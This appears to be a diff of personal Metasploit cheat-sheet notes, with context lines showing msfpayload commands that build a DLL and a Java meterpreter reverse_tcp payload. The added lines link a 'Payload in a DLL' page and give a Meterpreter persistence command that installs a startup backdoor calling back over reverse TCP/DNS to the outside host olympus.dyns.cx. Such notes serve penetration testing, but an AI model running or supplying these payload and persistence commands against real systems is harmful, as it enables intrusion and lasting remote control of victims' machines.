@@ -22,8 +22,12 @@ msfpayload windows/exec CMD=calc.exe D > test.dll
 Java Jar file (note the [R]aw and not [J]avascript output.)
 ./msfpayload java/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT 9996 R > file.jar 
 
+[Payload in a DLL](/payloaddll) - (msfvenom can do this now, but interesting for future anyway.)
 # Known Attack Patterns
 # Writing Exploits
 # Post Module Tricks
+run persistence -P windows/meterpreter/reverse_tcp_dns -S -i 9000 -p 9998 -r olympus.dyns.cx
+-i - I think is interval
+
 # MSFDB Commands
 # MSF RPC Connections
